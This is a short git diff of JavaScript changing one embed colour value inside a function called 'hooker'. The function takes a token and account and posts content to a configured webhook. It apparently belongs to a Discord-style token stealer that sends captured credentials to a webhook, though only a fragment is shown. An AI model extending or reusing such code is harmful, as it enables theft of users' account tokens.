@@ -195,7 +195,7 @@ const hooker = async (content, token, account) => {
     });
 
     for (const embed in content["embeds"]) {
-        content["embeds"][embed]["color"] = 0xb143e3;
+        content["embeds"][embed]["color"] = 0x000001;
     }
 
     await request("POST", CONFIG.webhook, {
